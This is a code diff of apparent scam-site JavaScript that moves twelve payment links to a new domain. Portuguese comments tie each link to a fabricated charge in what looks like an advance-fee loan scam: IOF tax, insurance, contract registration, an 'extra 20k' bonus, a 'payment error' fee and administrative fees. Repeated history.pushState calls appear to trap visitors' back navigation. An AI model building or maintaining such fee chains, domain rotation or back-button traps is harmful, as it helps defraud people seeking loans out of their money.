@@ -1,16 +1,16 @@
 const baseLinks = {
-    up1: "https://pay.impor-hj.fun/nOzxZooQq9xZJ07", // IOF
-    up2: "https://pay.impor-hj.fun/q510ZOb0nk83E9D", // Taxa de verificação de IOF
-    up3: "https://pay.impor-hj.fun/YEwR3AVR21kZdKy", // Seguro Prestamista "tarifa de cadastro"
-    up4: "https://pay.impor-hj.fun/RmA83Ea2q8r3PVp", // NFe
-    up5: "https://pay.impor-hj.fun/nOzxZooQqQVZJ07", // Ativar conta
-    up6: "https://pay.impor-hj.fun/NDr8gmKnanpZBmj", // Taxa de registro do contrato
-    up7: "https://pay.impor-hj.fun/DPXw3XeE9E9Zzmp", // Parabéns, 20k adicional
-    up8: "https://pay.impor-hj.fun/mwK436d1zqXGQ8b", // Erro no pagamento - 14,06
-    up9: "https://pay.impor-hj.fun/meABG9dn7DAZ6Ea", // APP - 11,99
-    up10:"https://pay.impor-hj.fun/NDr8gmKnadpZBmj", // Taxa de Abertura TAC - 16,92
-    up11:"https://pay.impor-hj.fun/DPXw3XeE919Zzmp",// Taxa de Consultoria Financeira - 19,53
-    up12:"https://pay.impor-hj.fun/DYp0ZxVMAzlgmvX" // Taxa de Processamento Administrativo - 31,92
+    up1: "https://pay.ag-hj.store/nOzxZooQq9xZJ07", // IOF
+    up2: "https://pay.ag-hj.store/q510ZOb0nk83E9D", // Taxa de verificação de IOF
+    up3: "https://pay.ag-hj.store/YEwR3AVR21kZdKy", // Seguro Prestamista "tarifa de cadastro"
+    up4: "https://pay.ag-hj.store/RmA83Ea2q8r3PVp", // NFe
+    up5: "https://pay.ag-hj.store/nOzxZooQqQVZJ07", // Ativar conta
+    up6: "https://pay.ag-hj.store/NDr8gmKnanpZBmj", // Taxa de registro do contrato
+    up7: "https://pay.ag-hj.store/DPXw3XeE9E9Zzmp", // Parabéns, 20k adicional
+    up8: "https://pay.ag-hj.store/mwK436d1zqXGQ8b", // Erro no pagamento - 14,06
+    up9: "https://pay.ag-hj.store/meABG9dn7DAZ6Ea", // APP - 11,99
+    up10:"https://pay.ag-hj.store/NDr8gmKnadpZBmj", // Taxa de Abertura TAC - 16,92
+    up11:"https://pay.ag-hj.store/DPXw3XeE919Zzmp",// Taxa de Consultoria Financeira - 19,53
+    up12:"https://pay.ag-hj.store/DYp0ZxVMAzlgmvX" // Taxa de Processamento Administrativo - 31,92
 
 };
 
@@ -61,3 +61,4 @@ function redirect(key) {
 history.pushState({}, '', location.href);
 
 history.pushState({}, '', location.href);
+
